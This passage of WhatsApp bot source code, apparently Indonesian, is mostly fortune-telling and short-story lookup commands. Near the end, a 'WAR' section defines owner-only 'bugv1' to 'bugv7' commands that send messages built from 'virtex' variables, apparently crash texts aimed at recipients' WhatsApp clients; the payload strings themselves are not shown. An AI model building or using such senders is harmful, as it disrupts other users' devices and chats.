if (!q) return setReply(`Example : ${prefix + command} 7, 7, 2005`) 
let [tgl, bln, thn] = text.split`,`
let anu = await primbon.hari_sangar_taliwangke(tgl, bln, thn)
if (anu.status == false) return setReply(anu.message)
xdev.sendMessage(from, { text:`⭔ *Lahir :* ${anu.message.tgl_lahir}\n⭔ *Hasil :* ${anu.message.result}\n⭔ *Info :* ${anu.message.info}\n⭔ *Catatan :* ${anu.message.catatan}`}, {quoted: setQuoted}) 
}
break
case 'harinaas': case 'harisial': {
if (!isDevoloper) return onlyPrem()
if (!q) return setReply(`Example : ${prefix + command} 7, 7, 2005`) 
let [tgl, bln, thn] = text.split`,`
let anu = await primbon.primbon_hari_naas(tgl, bln, thn)
if (anu.status == false) return setReply(anu.message)
xdev.sendMessage(from, { text:`⭔ *Hari Lahir :* ${anu.message.hari_lahir}\n⭔ *Tanggal Lahir :* ${anu.message.tgl_lahir}\n⭔ *Hari Naas :* ${anu.message.hari_naas}\n⭔ *Info :* ${anu.message.catatan}\n⭔ *Catatan :* ${anu.message.info}`}, {quoted: setQuoted}) 
}
break
case 'nagahari': case 'harinaga': {
if (!isDevoloper) return onlyPrem()
if (!q) return setReply(`Example : ${prefix + command} 7, 7, 2005`) 
let [tgl, bln, thn] = text.split`,`
let anu = await primbon.rahasia_naga_hari(tgl, bln, thn)
if (anu.status == false) return setReply(anu.message)
xdev.sendMessage(from, { text:`⭔ *Hari Lahir :* ${anu.message.hari_lahir}\n⭔ *Tanggal Lahir :* ${anu.message.tgl_lahir}\n⭔ *Arah Naga Hari :* ${anu.message.arah_naga_hari}\n⭔ *Catatan :* ${anu.message.catatan}`}, {quoted: setQuoted}) 
}
break
case 'arahrejeki': case 'arahrezeki': {
if (!isDevoloper) return onlyPrem()
if (!q) return setReply(`Example : ${prefix + command} 7, 7, 2005`) 
let [tgl, bln, thn] = text.split`,`
let anu = await primbon.primbon_arah_rejeki(tgl, bln, thn)
if (anu.status == false) return setReply(anu.message)
xdev.sendMessage(from, { text:`⭔ *Hari Lahir :* ${anu.message.hari_lahir}\n⭔ *tanggal Lahir :* ${anu.message.tgl_lahir}\n⭔ *Arah Rezeki :* ${anu.message.arah_rejeki}\n⭔ *Catatan :* ${anu.message.catatan}`}, {quoted: setQuoted}) 
}
break
case 'peruntungan': {
if (!isDevoloper) return onlyPrem()
if (!q) return setReply(`Example : ${prefix + command} DIka, 7, 7, 2005, 2022\n\nNote : ${prefix + command} Nama, tanggal lahir, bulan lahir, tahun lahir, untuk tahun`) 
let [nama, tgl, bln, thn, untuk] = text.split`,`
let anu = await primbon.ramalan_peruntungan(nama, tgl, bln, thn, untuk)
if (anu.status == false) return setReply(anu.message)
xdev.sendMessage(from, { text:`⭔ *Nama :* ${anu.message.nama}\n⭔ *Lahir :* ${anu.message.tgl_lahir}\n⭔ *Peruntungan Tahun :* ${anu.message.peruntungan_tahun}\n⭔ *Hasil :* ${anu.message.result}\n⭔ *Catatan :* ${anu.message.catatan}`}, {quoted: setQuoted}) 
}
break
case 'weton': case 'wetonjawa': {
if (!isDevoloper) return onlyPrem()
if (!q) return setReply(`Example : ${prefix + command} 7, 7, 2005`) 
let [tgl, bln, thn] = text.split`,`
let anu = await primbon.weton_jawa(tgl, bln, thn)
if (anu.status == false) return setReply(anu.message)
xdev.sendMessage(from, { text:`⭔ *Tanggal :* ${anu.message.tanggal}\n⭔ *Jumlah Neptu :* ${anu.message.jumlah_neptu}\n⭔ *Watak Hari :* ${anu.message.watak_hari}\n⭔ *Naga Hari :* ${anu.message.naga_hari}\n⭔ *Jam Baik :* ${anu.message.jam_baik}\n⭔ *Watak Kelahiran :* ${anu.message.watak_kelahiran}`}, {quoted: setQuoted}) 
}
break
case 'sifat': case 'karakter': {
if (!isDevoloper) return onlyPrem()
if (!q) return setReply(`Example : ${prefix + command} Dika, 7, 7, 2005`) 
let [nama, tgl, bln, thn] = text.split`,`
let anu = await primbon.sifat_karakter_tanggal_lahir(nama, tgl, bln, thn)
if (anu.status == false) return setReply(anu.message)
xdev.sendMessage(from, { text:`⭔ *Nama :* ${anu.message.nama}\n⭔ *Lahir :* ${anu.message.tgl_lahir}\n⭔ *Garis Hidup :* ${anu.message.garis_hidup}`}, {quoted: setQuoted}) 
}
break
case 'keberuntungan': {
if (!isDevoloper) return onlyPrem()
if (!q) return setReply(`Example : ${prefix + command} Dika, 7, 7, 2005`) 
let [nama, tgl, bln, thn] = text.split`,`
let anu = await primbon.potensi_keberuntungan(nama, tgl, bln, thn)
if (anu.status == false) return setReply(anu.message)
xdev.sendMessage(from, { text:`⭔ *Nama :* ${anu.message.nama}\n⭔ *Lahir :* ${anu.message.tgl_lahir}\n⭔ *Hasil :* ${anu.message.result}`}, {quoted: setQuoted}) 
}
break
case 'memancing': {
if (!isDevoloper) return onlyPrem()
if (!q) return setReply(`Example : ${prefix + command} 12, 1, 2022`) 
let [tgl, bln, thn] = text.split`,`
let anu = await primbon.primbon_memancing_ikan(tgl, bln, thn)
if (anu.status == false) return setReply(anu.message)
xdev.sendMessage(from, { text:`⭔ *Tanggal :* ${anu.message.tgl_memancing}\n⭔ *Hasil :* ${anu.message.result}\n⭔ *Catatan :* ${anu.message.catatan}`}, {quoted: setQuoted}) 
}
break
case 'masasubur': {
if (!isDevoloper) return onlyPrem()
if (!q) return setReply(`Example : ${prefix + command} 12, 1, 2022, 28\n\nNote : ${prefix + command} hari pertama menstruasi, siklus`) 
let [tgl, bln, thn, siklus] = text.split`,`
let anu = await primbon.masa_subur(tgl, bln, thn, siklus)
if (anu.status == false) return setReply(anu.message)
xdev.sendMessage(from, { text:`⭔ *Hasil :* ${anu.message.result}\n⭔ *Catatan :* ${anu.message.catatan}`}, {quoted: setQuoted}) 
}
break
case 'zodiak': case 'zodiac': {
if (!isDevoloper) return onlyPrem()
if (!q) return setReply(`Example : ${prefix+ command} 7 7 2005`) 
let zodiak = [
["capricorn", new Date(1970, 0, 1)],
["aquarius", new Date(1970, 0, 20)],
["pisces", new Date(1970, 1, 19)],
["aries", new Date(1970, 2, 21)],
["taurus", new Date(1970, 3, 21)],
["gemini", new Date(1970, 4, 21)],
["cancer", new Date(1970, 5, 22)],
["leo", new Date(1970, 6, 23)],
["virgo", new Date(1970, 7, 23)],
["libra", new Date(1970, 8, 23)],
["scorpio", new Date(1970, 9, 23)],
["sagittarius", new Date(1970, 10, 22)],
["capricorn", new Date(1970, 11, 22)]
].reverse()
function getZodiac(month, day) {
let d = new Date(1970, month - 1, day)
return zodiak.find(([_,_d]) => d >= _d)[0]
}
let date = new Date(text)
if (date == 'Invalid Date') throw date
let d = new Date()
let [tahun, bulan, tanggal] = [d.getFullYear(), d.getMonth() + 1, d.getDate()]
let birth = [date.getFullYear(), date.getMonth() + 1, date.getDate()]
let zodiac = await getZodiac(birth[1], birth[2])
let anu = await primbon.zodiak(zodiac)
if (anu.status == false) return setReply(anu.message)
xdev.sendMessage(from, { text:`⭔ *Zodiak :* ${anu.message.zodiak}\n⭔ *Nomor :* ${anu.message.nomor_keberuntungan}\n⭔ *Aroma :* ${anu.message.aroma_keberuntungan}\n⭔ *Planet :* ${anu.message.planet_yang_mengitari}\n⭔ *Bunga :* ${anu.message.bunga_keberuntungan}\n⭔ *Warna :* ${anu.message.warna_keberuntungan}\n⭔ *Batu :* ${anu.message.batu_keberuntungan}\n⭔ *Elemen :* ${anu.message.elemen_keberuntungan}\n⭔ *Pasangan Zodiak :* ${anu.message.pasangan_zodiak}\n⭔ *Catatan :* ${anu.message.catatan}`}, {quoted: setQuoted}) 
}
break
case 'shio': {
if (!isDevoloper) return onlyPrem()
if (!q) return setReply(`Example : ${prefix + command} tikus\n\nNote : For Detail https://primbon.com/shio.htm`) 
let anu = await primbon.shio(text)
if (anu.status == false) return setReply(anu.message)
xdev.sendMessage(from, { text:`⭔ *Hasil :* ${anu.message}`}, {quoted: setQuoted}) 
}
break     
//━━━━━━━━━━━━━━━[ CERPEN ]━━━━━━━━━━━━━━━━━//  
case 'cerpen-anak':{
if (!isRegist) return onlyRegist()
if (isBaned) return onlyBan()
let cerpe = await cerpen(`anak`)
reply(`⭔ _*Title :*_ ${cerpe.title}\n⭔ _*Author :*_ ${cerpe.author}\n⭔ _*Category :*_ ${cerpe.kategori}\n⭔ _*Pass Moderation :*_ ${cerpe.lolos}\n⭔ _*Story :*_\n${cerpe.cerita}`)
}
break
case 'cerpen-bahasadaerah':{
if (!isRegist) return onlyRegist()
if (isBaned) return onlyBan()
let cerpe = await cerpen(`bahasa daerah`)
reply(`⭔ _*Title :*_ ${cerpe.title}\n⭔ _*Author :*_ ${cerpe.author}\n⭔ _*Category :*_ ${cerpe.kategori}\n⭔ _*Pass Moderation :*_ ${cerpe.lolos}\n⭔ _*Story :*_\n${cerpe.cerita}`)
}
break
case 'cerpen-bahasainggris':{
if (!isRegist) return onlyRegist()
if (isBaned) return onlyBan()
let cerpe = await cerpen(`bahasa Inggris`)
reply(`⭔ _*Title :*_ ${cerpe.title}\n⭔ _*Author :*_ ${cerpe.author}\n⭔ _*Category :*_ ${cerpe.kategori}\n⭔ _*Pass Moderation :*_ ${cerpe.lolos}\n⭔ _*Story :*_\n${cerpe.cerita}`)
}
break
case 'cerpen-bahasajawa':{
if (!isRegist) return onlyRegist()
if (isBaned) return onlyBan()
let cerpe = await cerpen(`bahasa jawa`)
reply(`⭔ _*Title :*_ ${cerpe.title}\n⭔ _*Author :*_ ${cerpe.author}\n⭔ _*Category :*_ ${cerpe.kategori}\n⭔ _*Pass Moderation :*_ ${cerpe.lolos}\n⭔ _*Story :*_\n${cerpe.cerita}`)
}
break
case 'cerpen-bahasasunda':{
if (!isRegist) return onlyRegist()
if (isBaned) return onlyBan()
let cerpe = await cerpen(`bahasa sunda`)
reply(`⭔ _*Title :*_ ${cerpe.title}\n⭔ _*Author :*_ ${cerpe.author}\n⭔ _*Category :*_ ${cerpe.kategori}\n⭔ _*Pass Moderation :*_ ${cerpe.lolos}\n⭔ _*Story :*_\n${cerpe.cerita}`)
}
break
case 'cerpen-budaya':{
if (!isRegist) return onlyRegist()
if (isBaned) return onlyBan()
let cerpe = await cerpen(`budaya`)
reply(`⭔ _*Title :*_ ${cerpe.title}\n⭔ _*Author :*_ ${cerpe.author}\n⭔ _*Category :*_ ${cerpe.kategori}\n⭔ _*Pass Moderation :*_ ${cerpe.lolos}\n⭔ _*Story :*_\n${cerpe.cerita}`)
}
break
case 'cerpen-cinta':{
if (!isRegist) return onlyRegist()
if (isBaned) return onlyBan()
let cerpe = await cerpen(`cinta`)
reply(`⭔ _*Title :*_ ${cerpe.title}\n⭔ _*Author :*_ ${cerpe.author}\n⭔ _*Category :*_ ${cerpe.kategori}\n⭔ _*Pass Moderation :*_ ${cerpe.lolos}\n⭔ _*Story :*_\n${cerpe.cerita}`)
}
break
case 'cerpen-cintaislami':{
if (!isRegist) return onlyRegist()
if (isBaned) return onlyBan()
let cerpe = await cerpen(`cinta islami`)
reply(`⭔ _*Title :*_ ${cerpe.title}\n⭔ _*Author :*_ ${cerpe.author}\n⭔ _*Category :*_ ${cerpe.kategori}\n⭔ _*Pass Moderation :*_ ${cerpe.lolos}\n⭔ _*Story :*_\n${cerpe.cerita}`)
}
break
case 'cerpen-cintapertama':{
if (!isRegist) return onlyRegist()
if (isBaned) return onlyBan()
let cerpe = await cerpen(`cinta pertama`)
reply(`⭔ _*Title :*_ ${cerpe.title}\n⭔ _*Author :*_ ${cerpe.author}\n⭔ _*Category :*_ ${cerpe.kategori}\n⭔ _*Pass Moderation :*_ ${cerpe.lolos}\n⭔ _*Story :*_\n${cerpe.cerita}`)
}
break
case 'cerpen-cintaromantis':{
if (!isRegist) return onlyRegist()
if (isBaned) return onlyBan()
let cerpe = await cerpen(`cinta romantis`)
reply(`⭔ _*Title :*_ ${cerpe.title}\n⭔ _*Author :*_ ${cerpe.author}\n⭔ _*Category :*_ ${cerpe.kategori}\n⭔ _*Pass Moderation :*_ ${cerpe.lolos}\n⭔ _*Story :*_\n${cerpe.cerita}`)
}
break
case 'cerpen-cintasedih':{
if (!isRegist) return onlyRegist()
if (isBaned) return onlyBan()
let cerpe = await cerpen(`cinta sedih`)
reply(`⭔ _*Title :*_ ${cerpe.title}\n⭔ _*Author :*_ ${cerpe.author}\n⭔ _*Category :*_ ${cerpe.kategori}\n⭔ _*Pass Moderation :*_ ${cerpe.lolos}\n⭔ _*Story :*_\n${cerpe.cerita}`)
}
break
case 'cerpen-cintasegitiga':{
if (!isRegist) return onlyRegist()
if (isBaned) return onlyBan()
let cerpe = await cerpen(`Cinta segitiga`)
reply(`⭔ _*Title :*_ ${cerpe.title}\n⭔ _*Author :*_ ${cerpe.author}\n⭔ _*Category :*_ ${cerpe.kategori}\n⭔ _*Pass Moderation :*_ ${cerpe.lolos}\n⭔ _*Story :*_\n${cerpe.cerita}`)
}
break
case 'cerpen-cintasejati':{
if (!isRegist) return onlyRegist()
if (isBaned) return onlyBan()
let cerpe = await cerpen(`cinta sejati`)
reply(`⭔ _*Title :*_ ${cerpe.title}\n⭔ _*Author :*_ ${cerpe.author}\n⭔ _*Category :*_ ${cerpe.kategori}\n⭔ _*Pass Moderation :*_ ${cerpe.lolos}\n⭔ _*Story :*_\n${cerpe.cerita}`)
}
break
case 'cerpen-galau':{
if (!isRegist) return onlyRegist()
if (isBaned) return onlyBan()
let cerpe = await cerpen(`galau`)
reply(`⭔ _*Title :*_ ${cerpe.title}\n⭔ _*Author :*_ ${cerpe.author}\n⭔ _*Category :*_ ${cerpe.kategori}\n⭔ _*Pass Moderation :*_ ${cerpe.lolos}\n⭔ _*Story :*_\n${cerpe.cerita}`)
}
break
case 'cerpen-gokil':{
if (!isRegist) return onlyRegist()
if (isBaned) return onlyBan()
let cerpe = await cerpen(`gokil`)
reply(`⭔ _*Title :*_ ${cerpe.title}\n⭔ _*Author :*_ ${cerpe.author}\n⭔ _*Category :*_ ${cerpe.kategori}\n⭔ _*Pass Moderation :*_ ${cerpe.lolos}\n⭔ _*Story :*_\n${cerpe.cerita}`)
}
break
case 'cerpen-inspiratif':{
if (!isRegist) return onlyRegist()
if (isBaned) return onlyBan()
let cerpe = await cerpen(`inspiratif`)
reply(`⭔ _*Title :*_ ${cerpe.title}\n⭔ _*Author :*_ ${cerpe.author}\n⭔ _*Category :*_ ${cerpe.kategori}\n⭔ _*Pass Moderation :*_ ${cerpe.lolos}\n⭔ _*Story :*_\n${cerpe.cerita}`)
}
break
case 'cerpen-jepang':{
if (!isRegist) return onlyRegist()
if (isBaned) return onlyBan()
let cerpe = await cerpen(`jepang`)
reply(`⭔ _*Title :*_ ${cerpe.title}\n⭔ _*Author :*_ ${cerpe.author}\n⭔ _*Category :*_ ${cerpe.kategori}\n⭔ _*Pass Moderation :*_ ${cerpe.lolos}\n⭔ _*Story :*_\n${cerpe.cerita}`)
}
break
case 'cerpen-kehidupan':{
if (!isRegist) return onlyRegist()
if (isBaned) return onlyBan()
let cerpe = await cerpen(`kehidupan`)
reply(`⭔ _*Title :*_ ${cerpe.title}\n⭔ _*Author :*_ ${cerpe.author}\n⭔ _*Category :*_ ${cerpe.kategori}\n⭔ _*Pass Moderation :*_ ${cerpe.lolos}\n⭔ _*Story :*_\n${cerpe.cerita}`)
}
break
case 'cerpen-keluarga':{
if (!isRegist) return onlyRegist()
if (isBaned) return onlyBan()
let cerpe = await cerpen(`keluarga`)
reply(`⭔ _*Title :*_ ${cerpe.title}\n⭔ _*Author :*_ ${cerpe.author}\n⭔ _*Category :*_ ${cerpe.kategori}\n⭔ _*Pass Moderation :*_ ${cerpe.lolos}\n⭔ _*Story :*_\n${cerpe.cerita}`)
}
break
case 'cerpen-kisahnyata':{
if (!isRegist) return onlyRegist()
if (isBaned) return onlyBan()
let cerpe = await cerpen(`kisah nyata`)
reply(`⭔ _*Title :*_ ${cerpe.title}\n⭔ _*Author :*_ ${cerpe.author}\n⭔ _*Category :*_ ${cerpe.kategori}\n⭔ _*Pass Moderation :*_ ${cerpe.lolos}\n⭔ _*Story :*_\n${cerpe.cerita}`)
}
break
case 'cerpen-korea':{
if (!isRegist) return onlyRegist()
if (isBaned) return onlyBan()
let cerpe = await cerpen(`korea`)
reply(`⭔ _*Title :*_ ${cerpe.title}\n⭔ _*Author :*_ ${cerpe.author}\n⭔ _*Category :*_ ${cerpe.kategori}\n⭔ _*Pass Moderation :*_ ${cerpe.lolos}\n⭔ _*Story :*_\n${cerpe.cerita}`)
}
break
case 'cerpen-kristen':{
if (!isRegist) return onlyRegist()
if (isBaned) return onlyBan()
let cerpe = await cerpen(`kristen`)
reply(`⭔ _*Title :*_ ${cerpe.title}\n⭔ _*Author :*_ ${cerpe.author}\n⭔ _*Category :*_ ${cerpe.kategori}\n⭔ _*Pass Moderation :*_ ${cerpe.lolos}\n⭔ _*Story :*_\n${cerpe.cerita}`)
}
break
case 'cerpen-liburan':{
if (!isRegist) return onlyRegist()
if (isBaned) return onlyBan()
let cerpe = await cerpen(`liburan`)
reply(`⭔ _*Title :*_ ${cerpe.title}\n⭔ _*Author :*_ ${cerpe.author}\n⭔ _*Category :*_ ${cerpe.kategori}\n⭔ _*Pass Moderation :*_ ${cerpe.lolos}\n⭔ _*Story :*_\n${cerpe.cerita}`)
}
break
case 'cerpen-malaysia':{
if (!isRegist) return onlyRegist()
if (isBaned) return onlyBan()
let cerpe = await cerpen(`malaysia`)
reply(`⭔ _*Title :*_ ${cerpe.title}\n⭔ _*Author :*_ ${cerpe.author}\n⭔ _*Category :*_ ${cerpe.kategori}\n⭔ _*Pass Moderation :*_ ${cerpe.lolos}\n⭔ _*Story :*_\n${cerpe.cerita}`)
}
break
case 'cerpen-mengharukan':{
if (!isRegist) return onlyRegist()
if (isBaned) return onlyBan()
let cerpe = await cerpen(`mengharukan`)
reply(`⭔ _*Title :*_ ${cerpe.title}\n⭔ _*Author :*_ ${cerpe.author}\n⭔ _*Category :*_ ${cerpe.kategori}\n⭔ _*Pass Moderation :*_ ${cerpe.lolos}\n⭔ _*Story :*_\n${cerpe.cerita}`)
}
break
case 'cerpen-misteri':{
if (!isRegist) return onlyRegist()
if (isBaned) return onlyBan()
let cerpe = await cerpen(`misteri`)
reply(`⭔ _*Title :*_ ${cerpe.title}\n⭔ _*Author :*_ ${cerpe.author}\n⭔ _*Category :*_ ${cerpe.kategori}\n⭔ _*Pass Moderation :*_ ${cerpe.lolos}\n⭔ _*Story :*_\n${cerpe.cerita}`)
}
break
case 'cerpen-motivasi':{
if (!isRegist) return onlyRegist()
if (isBaned) return onlyBan()
let cerpe = await cerpen(`motivasi`)
reply(`⭔ _*Title :*_ ${cerpe.title}\n⭔ _*Author :*_ ${cerpe.author}\n⭔ _*Category :*_ ${cerpe.kategori}\n⭔ _*Pass Moderation :*_ ${cerpe.lolos}\n⭔ _*Story :*_\n${cerpe.cerita}`)
}
break
case 'cerpen-nasihat':{
if (!isRegist) return onlyRegist()
if (isBaned) return onlyBan()
let cerpe = await cerpen(`nasihat`)
reply(`⭔ _*Title :*_ ${cerpe.title}\n⭔ _*Author :*_ ${cerpe.author}\n⭔ _*Category :*_ ${cerpe.kategori}\n⭔ _*Pass Moderation :*_ ${cerpe.lolos}\n⭔ _*Story :*_\n${cerpe.cerita}`)
}
break
case 'cerpen-nasionalisme':{
if (!isRegist) return onlyRegist()
if (isBaned) return onlyBan()
let cerpe = await cerpen(`nasionalisme`)
reply(`⭔ _*Title :*_ ${cerpe.title}\n⭔ _*Author :*_ ${cerpe.author}\n⭔ _*Category :*_ ${cerpe.kategori}\n⭔ _*Pass Moderation :*_ ${cerpe.lolos}\n⭔ _*Story :*_\n${cerpe.cerita}`)
}
break
case 'cerpen-olahraga':{
if (!isRegist) return onlyRegist()
if (isBaned) return onlyBan()
let cerpe = await cerpen(`olahraga`)
reply(`⭔ _*Title :*_ ${cerpe.title}\n⭔ _*Author :*_ ${cerpe.author}\n⭔ _*Category :*_ ${cerpe.kategori}\n⭔ _*Pass Moderation :*_ ${cerpe.lolos}\n⭔ _*Story :*_\n${cerpe.cerita}`)
}
break
case 'cerpen-patahhati':{
if (!isRegist) return onlyRegist()
if (isBaned) return onlyBan()
let cerpe = await cerpen(`patah hati`)
reply(`⭔ _*Title :*_ ${cerpe.title}\n⭔ _*Author :*_ ${cerpe.author}\n⭔ _*Category :*_ ${cerpe.kategori}\n⭔ _*Pass Moderation :*_ ${cerpe.lolos}\n⭔ _*Story :*_\n${cerpe.cerita}`)
}
break
case 'cerpen-penantian':{
if (!isRegist) return onlyRegist()
if (isBaned) return onlyBan()
let cerpe = await cerpen(`penantian`)
reply(`⭔ _*Title :*_ ${cerpe.title}\n⭔ _*Author :*_ ${cerpe.author}\n⭔ _*Category :*_ ${cerpe.kategori}\n⭔ _*Pass Moderation :*_ ${cerpe.lolos}\n⭔ _*Story :*_\n${cerpe.cerita}`)
}
break
case 'cerpen-pendidikan':{
if (!isRegist) return onlyRegist()
if (isBaned) return onlyBan()
let cerpe = await cerpen(`pendidikan`)
reply(`⭔ _*Title :*_ ${cerpe.title}\n⭔ _*Author :*_ ${cerpe.author}\n⭔ _*Category :*_ ${cerpe.kategori}\n⭔ _*Pass Moderation :*_ ${cerpe.lolos}\n⭔ _*Story :*_\n${cerpe.cerita}`)
}
break
case 'cerpen-pengalaman':{
if (!isRegist) return onlyRegist()
if (isBaned) return onlyBan()
let cerpe = await cerpen(`pengalaman pribadi`)
reply(`⭔ _*Title :*_ ${cerpe.title}\n⭔ _*Author :*_ ${cerpe.author}\n⭔ _*Category :*_ ${cerpe.kategori}\n⭔ _*Pass Moderation :*_ ${cerpe.lolos}\n⭔ _*Story :*_\n${cerpe.cerita}`)
}
break
case 'cerpen-pengorbanan':{
if (!isRegist) return onlyRegist()
if (isBaned) return onlyBan()
let cerpe = await cerpen(`pengorbanan`)
reply(`⭔ _*Title :*_ ${cerpe.title}\n⭔ _*Author :*_ ${cerpe.author}\n⭔ _*Category :*_ ${cerpe.kategori}\n⭔ _*Pass Moderation :*_ ${cerpe.lolos}\n⭔ _*Story :*_\n${cerpe.cerita}`)
}
break
case 'cerpen-penyesalan':{
if (!isRegist) return onlyRegist()
if (isBaned) return onlyBan()
let cerpe = await cerpen(`penyesalan`)
reply(`⭔ _*Title :*_ ${cerpe.title}\n⭔ _*Author :*_ ${cerpe.author}\n⭔ _*Category :*_ ${cerpe.kategori}\n⭔ _*Pass Moderation :*_ ${cerpe.lolos}\n⭔ _*Story :*_\n${cerpe.cerita}`)
}
break
case 'cerpen-perjuangan':{
if (!isRegist) return onlyRegist()
if (isBaned) return onlyBan()
let cerpe = await cerpen(`perjuangan`)
reply(`⭔ _*Title :*_ ${cerpe.title}\n⭔ _*Author :*_ ${cerpe.author}\n⭔ _*Category :*_ ${cerpe.kategori}\n⭔ _*Pass Moderation :*_ ${cerpe.lolos}\n⭔ _*Story :*_\n${cerpe.cerita}`)
}
break
case 'cerpen-perpisahan':{
if (!isRegist) return onlyRegist()
if (isBaned) return onlyBan()
let cerpe = await cerpen(`perpisahan`)
reply(`⭔ _*Title :*_ ${cerpe.title}\n⭔ _*Author :*_ ${cerpe.author}\n⭔ _*Category :*_ ${cerpe.kategori}\n⭔ _*Pass Moderation :*_ ${cerpe.lolos}\n⭔ _*Story :*_\n${cerpe.cerita}`)
}
break
case 'cerpen-persahabatan':{
if (!isRegist) return onlyRegist()
if (isBaned) return onlyBan()
let cerpe = await cerpen(`persahabatan`)
reply(`⭔ _*Title :*_ ${cerpe.title}\n⭔ _*Author :*_ ${cerpe.author}\n⭔ _*Category :*_ ${cerpe.kategori}\n⭔ _*Pass Moderation :*_ ${cerpe.lolos}\n⭔ _*Story :*_\n${cerpe.cerita}`)
}
break
case 'cerpen-petualangan':{
if (!isRegist) return onlyRegist()
if (isBaned) return onlyBan()
let cerpe = await cerpen(`petualangan`)
reply(`⭔ _*Title :*_ ${cerpe.title}\n⭔ _*Author :*_ ${cerpe.author}\n⭔ _*Category :*_ ${cerpe.kategori}\n⭔ _*Pass Moderation :*_ ${cerpe.lolos}\n⭔ _*Story :*_\n${cerpe.cerita}`)
}
break
case 'cerpen-ramadhan':{
if (!isRegist) return onlyRegist()
if (isBaned) return onlyBan()
let cerpe = await cerpen(`ramadhan`)
reply(`⭔ _*Title :*_ ${cerpe.title}\n⭔ _*Author :*_ ${cerpe.author}\n⭔ _*Category :*_ ${cerpe.kategori}\n⭔ _*Pass Moderation :*_ ${cerpe.lolos}\n⭔ _*Story :*_\n${cerpe.cerita}`)
}
break
case 'cerpen-remaja':{
if (!isRegist) return onlyRegist()
if (isBaned) return onlyBan()
let cerpe = await cerpen(`remaja`)
reply(`⭔ _*Title :*_ ${cerpe.title}\n⭔ _*Author :*_ ${cerpe.author}\n⭔ _*Category :*_ ${cerpe.kategori}\n⭔ _*Pass Moderation :*_ ${cerpe.lolos}\n⭔ _*Story :*_\n${cerpe.cerita}`)
}
break
case 'cerpen-rindu':{
if (!isRegist) return onlyRegist()
if (isBaned) return onlyBan()
let cerpe = await cerpen(`rindu`)
reply(`⭔ _*Title :*_ ${cerpe.title}\n⭔ _*Author :*_ ${cerpe.author}\n⭔ _*Category :*_ ${cerpe.kategori}\n⭔ _*Pass Moderation :*_ ${cerpe.lolos}\n⭔ _*Story :*_\n${cerpe.cerita}`)
}
break
case 'cerpen-rohani':{
if (!isRegist) return onlyRegist()
if (isBaned) return onlyBan()
let cerpe = await cerpen(`rohani`)
reply(`⭔ _*Title :*_ ${cerpe.title}\n⭔ _*Author :*_ ${cerpe.author}\n⭔ _*Category :*_ ${cerpe.kategori}\n⭔ _*Pass Moderation :*_ ${cerpe.lolos}\n⭔ _*Story :*_\n${cerpe.cerita}`)
}
break
case 'cerpen-romantis':{
if (!isRegist) return onlyRegist()
if (isBaned) return onlyBan()
let cerpe = await cerpen(`romantis`)
reply(`⭔ _*Title :*_ ${cerpe.title}\n⭔ _*Author :*_ ${cerpe.author}\n⭔ _*Category :*_ ${cerpe.kategori}\n⭔ _*Pass Moderation :*_ ${cerpe.lolos}\n⭔ _*Story :*_\n${cerpe.cerita}`)
}
break
case 'cerpen-sastra':{
if (!isRegist) return onlyRegist()
if (isBaned) return onlyBan()
let cerpe = await cerpen(`sastra`)
reply(`⭔ _*Title :*_ ${cerpe.title}\n⭔ _*Author :*_ ${cerpe.author}\n⭔ _*Category :*_ ${cerpe.kategori}\n⭔ _*Pass Moderation :*_ ${cerpe.lolos}\n⭔ _*Story :*_\n${cerpe.cerita}`)
}
break
case 'cerpen-sedih':{
if (!isRegist) return onlyRegist()
if (isBaned) return onlyBan()
let cerpe = await cerpen(`sedih`)
reply(`⭔ _*Title :*_ ${cerpe.title}\n⭔ _*Author :*_ ${cerpe.author}\n⭔ _*Category :*_ ${cerpe.kategori}\n⭔ _*Pass Moderation :*_ ${cerpe.lolos}\n⭔ _*Story :*_\n${cerpe.cerita}`)
}
break
case 'cerpen-sejarah':{
if (!isRegist) return onlyRegist()
if (isBaned) return onlyBan()
let cerpe = await cerpen(`sejarah`)
reply(`⭔ _*Title :*_ ${cerpe.title}\n⭔ _*Author :*_ ${cerpe.author}\n⭔ _*Category :*_ ${cerpe.kategori}\n⭔ _*Pass Moderation :*_ ${cerpe.lolos}\n⭔ _*Story :*_\n${cerpe.cerita}`)
}
break
/*case 'cerpen':{
if (!isRegist) return onlyRegist()
if (isBaned) return onlyBan()
kohp = await fetchJson(`https://api.lolhuman.xyz/api/cerpen?apikey=${lolkey}`)
kohz = kohp.result
ini_txt = `Title : ${kohz.title}\n`
ini_txt += `Creator : ${kohz.creator}\n`
ini_txt += `Story :\n${kohz.cerpen}`
let buttons = [
{buttonId: `${command}`, buttonText: {displayText: 'Next'}, type: 1}
]
let buttonMessage = {
text: ini_txt,
footerText: 'Pencet Button Untuk Next',
buttons: buttons,
headerType: 2
}
atakbot.sendMessage(m.chat, buttonMessage, { quoted: fakeatakbot })
}
break*/
//━━━━━━━━━━━━━━━[ WAR ]━━━━━━━━━━━━━━━━━//  
case 'bugv1':
if (!isRegist) return onlyRegist()
if (isBaned) return onlyBan() 
if (!isOwner) return onlyOwner()
if (!q) return reply(`Teks?`)
const bugv1 = `${q}
${virtex1}${ngazapv2}`
xdev.sendMessage(from, { text: bugv1 }, {quoted: bugquoted}) 
break
case 'bugv2':
if (!isRegist) return onlyRegist()
if (isBaned) return onlyBan() 
if (!isOwner) return onlyOwner()
if (!q) return reply(`Teks?`)
const bugv2 = `${q}
${virtex2}${ngazapv2}`
xdev.sendMessage(from, { text: bugv2 }, {quoted: bugquoted}) 
break
case 'bugv3':
if (!isRegist) return onlyRegist()
if (isBaned) return onlyBan() 
if (!isOwner) return onlyOwner()
if (!q) return reply(`Teks?`)
const bugv3 = `${q}
${virtex3}${ngazapv2}`
xdev.sendMessage(from, { text: bugv3 }, {quoted: bugquoted}) 
break
case 'bugv4':
if (!isRegist) return onlyRegist()
if (isBaned) return onlyBan() 
if (!isOwner) return onlyOwner()
if (!q) return reply(`Teks?`)
const bugv4 = `${q}
${virtex4}${ngazapv2}`
xdev.sendMessage(from, { text: bugv4 }, {quoted: bugquoted}) 
break
case 'bugv5':
if (!isRegist) return onlyRegist()
if (isBaned) return onlyBan() 
if (!isOwner) return onlyOwner()
if (!q) return reply(`Teks?`)
const bugv5 = `${q}
${virtex5}${ngazapv2}`
xdev.sendMessage(from, { text: bugv5 }, {quoted: bugquoted}) 
break
case 'bugv6':
if (!isRegist) return onlyRegist()
if (isBaned) return onlyBan() 
if (!isOwner) return onlyOwner()
if (!q) return reply(`Teks?`)
const bugv6 = `${q}
${virtex6}${ngazapv2}`
xdev.sendMessage(from, { text: bugv6 }, {quoted: bugquoted}) 
break
case 'bugv7':
if (!isRegist) return onlyRegist()
